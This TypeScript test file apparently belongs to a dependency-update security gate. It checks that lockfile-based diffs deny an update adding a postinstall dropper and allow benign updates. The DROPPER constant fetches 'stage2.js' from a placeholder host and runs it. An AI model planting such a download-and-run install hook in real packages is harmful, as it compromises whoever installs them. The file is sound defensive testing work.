// The gate's update path end to end (M3.6): a lockfile on disk, `createUpdateDiff` as the
// gate's `diffUpdate`, and `checkSpecs`. Offline: the registry is the in-memory fake, and
// the replay pairs are the synthetic, inert ones in packages/diff/fixtures/.

import { readdirSync, readFileSync, statSync } from "node:fs";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { createGateData, checkSpecs, preloadAnalyzer, serializeDecision, type Decision } from "@depward/gate";
import { afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
import { createUpdateDiff, lockedVersionFor } from "../src/index.ts";
import { fakeRegistry, type FakePackage, type FakeRegistry } from "./fake-registry.ts";

const NOW = Date.parse("2026-11-10T12:00:00.000Z");
const data = createGateData([], []);

const DROPPER = `const https = require("https");
const { spawn } = require("child_process");
https.get("https://cdn.example.invalid/stage2.js", (res) => {
  let body = "";
  res.on("data", (c) => (body += c));
  res.on("end", () => spawn(process.execPath, ["-e", body]));
});
`;

const at = (...versions: string[]) => versions.map((version) => ({ version, lockfile: "package-lock.json" }));

describe("lockedVersionFor", () => {
  test("nothing locked, or the requested version already locked, is not an update", () => {
    expect(lockedVersionFor([], "1.0.0")).toBeNull();
    expect(lockedVersionFor(at("1.0.0", "2.0.0"), "2.0.0")).toBeNull();
  });

  test("prefers the highest locked version with the same major, else the highest", () => {
    expect(lockedVersionFor(at("1.2.0", "2.0.0", "1.10.0"), "1.11.0")?.version).toBe("1.10.0");
    expect(lockedVersionFor(at("1.2.0", "2.0.0"), "3.0.0")?.version).toBe("2.0.0");
    expect(lockedVersionFor(at("2.0.0"), "1.0.0")?.version).toBe("2.0.0");
  });
});

let dir: string;
beforeAll(async () => {
  await preloadAnalyzer();
});
beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "depward-update-"));
});
afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

async function lock(reg: FakeRegistry, packages: Record<string, string>): Promise<void> {
  const out: Record<string, unknown> = { "": { name: "root" } };
  for (const [name, version] of Object.entries(packages)) {
    out[`node_modules/${name}`] = { version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: reg.integrity(name, version) };
  }
  await writeFile(join(dir, "package-lock.json"), JSON.stringify({ name: "root", lockfileVersion: 3, packages: out }, null, 2));
}

function check(reg: FakeRegistry, specs: string[]): Promise<Decision> {
  return checkSpecs(specs, { registry: reg.client, data, now: () => NOW, diffUpdate: createUpdateDiff({ cwd: dir, registry: reg.client, now: () => NOW }) });
}

const ids = (d: Decision, i = 0) => d.packages[i]?.findings.map((x) => `${x.finding.id}:${x.action}`).toSorted();
const tarballs = (reg: FakeRegistry) => reg.requests.filter((u) => u.endsWith(".tgz")).map((u) => u.slice(u.lastIndexOf("/") + 1));

describe("createUpdateDiff with the gate", () => {
  const packages: Record<string, FakePackage> = {
    "fx-a": {
      versions: {
        "1.0.0": {},
        "1.0.1": { files: { "index.js": "module.exports = 1;\n", "install.js": DROPPER }, scripts: { postinstall: "node install.js" } },
      },
    },
    "fx-b": { versions: { "2.0.0": {}, "2.1.0": { files: { "index.js": "module.exports = 2;\n" } } } },
    "fx-new": { versions: { "1.0.0": {} } },
  };

  test("an update that adds a downloading postinstall is denied, with the diff against the locked version", async () => {
    const reg = fakeRegistry(packages);
    await lock(reg, { "fx-a": "1.0.0" });
    const d = await check(reg, ["fx-a@1.0.1"]);
    expect(d.action).toBe("deny");
    expect(d.packages[0]?.update).toEqual({ from: "1.0.0", lockfile: "package-lock.json" });
    // Two or more high diff findings escalate to deny, like the diff's own risk rule.
    expect(ids(d)).toEqual(expect.arrayContaining([
      "diff-new-capability:deny",
      "diff-new-install-script:deny",
      "diff-new-network-in-non-network-pkg:deny",
      "diff-semver-mismatch:allow",
    ]));
    expect(d.packages[0]?.findings.find((x) => x.finding.id === "diff-new-install-script")?.source).toBe("escalation");
    expect(d.reasons.some((r) => r.startsWith("deny fx-a@1.0.1 (update from 1.0.0): diff-new-install-script"))).toBe(true);
    expect(serializeDecision(d).packages[0]?.update).toEqual({ from: "1.0.0", lockfile: "package-lock.json" });
    expect(tarballs(reg).toSorted()).toEqual(["fx-a-1.0.0.tgz", "fx-a-1.0.1.tgz"]);
  });

  test("a benign update is allowed and still records what it was diffed against", async () => {
    const reg = fakeRegistry(packages);
    await lock(reg, { "fx-b": "2.0.0" });
    const d = await check(reg, ["fx-b@2.1.0"]);
    expect(d.action).toBe("allow");
    expect(d.packages[0]?.update).toEqual({ from: "2.0.0", lockfile: "package-lock.json" });
    expect(ids(d)).toEqual([]);
  });

  test("a package that isn't locked, or is locked at the requested version, gets no diff", async () => {
    const reg = fakeRegistry(packages);
    await lock(reg, { "fx-a": "1.0.0" });
    const d = await check(reg, ["fx-new@1.0.0", "fx-a@1.0.0"]);
    expect(d.packages.map((p) => p.update)).toEqual([null, null]);
    expect(tarballs(reg).toSorted()).toEqual(["fx-a-1.0.0.tgz", "fx-new-1.0.0.tgz"]);
  });

  test("without a lockfile the gate behaves as before", async () => {
    const reg = fakeRegistry(packages);
    const d = await check(reg, ["fx-b@2.1.0"]);
    expect(d.packages[0]?.update).toBeNull();
    expect(d.action).toBe("allow");
  });

  test("a lockfile that can't be parsed costs onError instead of skipping the diff silently", async () => {
    const reg = fakeRegistry(packages);
    await writeFile(join(dir, "package-lock.json"), "{ not json");
    const d = await check(reg, ["fx-b@2.1.0"]);
    expect(d.packages[0]?.errors.map((e) => e.code)).toEqual(["INVALID_LOCKFILE"]);
    expect(d.packages[0]?.errorAction).toBe("ask");
    expect(d.action).toBe("ask");
  });

  test("a locked version missing from the registry is an error, not a pass", async () => {
    const reg = fakeRegistry(packages);
    await writeFile(join(dir, "package-lock.json"), JSON.stringify({
      name: "root", lockfileVersion: 3,
      packages: { "": { name: "root" }, "node_modules/fx-b": { version: "1.9.0", resolved: "https://registry.npmjs.org/fx-b/-/fx-b-1.9.0.tgz", integrity: `sha512-${"A".repeat(86)}==` } },
    }));
    const d = await check(reg, ["fx-b@2.1.0"]);
    expect(d.packages[0]?.update).toEqual({ from: "1.9.0", lockfile: "package-lock.json" });
    expect(d.packages[0]?.errors.map((e) => e.code)).toEqual(["NOT_FOUND"]);
    expect(d.action).toBe("ask");
  });

  test("the lockfiles are read once per callback", async () => {
    const reg = fakeRegistry(packages);
    await lock(reg, { "fx-b": "2.0.0" });
    const diffUpdate = createUpdateDiff({ cwd: dir, registry: reg.client, now: () => NOW });
    const opts = { registry: reg.client, data, now: () => NOW, diffUpdate };
    expect((await checkSpecs(["fx-b@2.1.0"], opts)).packages[0]?.update?.from).toBe("2.0.0");
    await lock(reg, { "fx-b": "2.1.0" });
    expect((await checkSpecs(["fx-b@2.1.0"], opts)).packages[0]?.update?.from).toBe("2.0.0");
  });
});

// The Phase 3 replay pairs, installed as updates through the gate. The three documented
// attack patterns (roadmap Phase 3 definition of done) are all critical, so denied.
const ROOT = fileURLToPath(new URL("../fixtures/", import.meta.url));
const cases = readdirSync(ROOT).filter((d) => statSync(join(ROOT, d)).isDirectory()).toSorted();

function walk(root: string): string[] {
  return readdirSync(root).flatMap((name) => {
    const p = join(root, name);
    return statSync(p).isDirectory() ? walk(p) : [p];
  });
}

function side(root: string): { name: string; version: string; files: Record<string, string>; scripts?: Record<string, string>; dependencies?: Record<string, string> } {
  const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8")) as { name: string; version: string; scripts?: Record<string, string>; dependencies?: Record<string, string> };
  const files = Object.fromEntries(walk(root).map((p) => [relative(root, p).replaceAll("\\", "/"), readFileSync(p, "utf8")]).filter(([p]) => p !== "package.json"));
  return { name: pkg.name, version: pkg.version, files, ...(pkg.scripts ? { scripts: pkg.scripts } : {}), ...(pkg.dependencies ? { dependencies: pkg.dependencies } : {}) };
}

// The gate's action matches the pair's diff risk: critical → deny, high → ask, else allow.
describe.each(cases)("replay %s through the gate", (name) => {
  const { risk } = JSON.parse(readFileSync(join(ROOT, name, "expected.json"), "utf8")) as { risk: string };
  const expected = risk === "critical" ? "deny" : risk === "high" ? "ask" : "allow";
  test(`is ${expected} (diff risk ${risk})`, async () => {
    const a = side(join(ROOT, name, "a"));
    const b = side(join(ROOT, name, "b"));
    const { name: _a, version: va, ...fa } = a;
    const { name: _b, version: vb, ...fb } = b;
    const reg = fakeRegistry({ [a.name]: { versions: { [va]: fa, [vb]: fb } } });
    await lock(reg, { [a.name]: va });
    const d = await check(reg, [`${a.name}@${vb}`]);
    expect(d.packages[0]?.update?.from).toBe(va);
    expect(d.action, JSON.stringify(ids(d))).toBe(expected);
  });
});
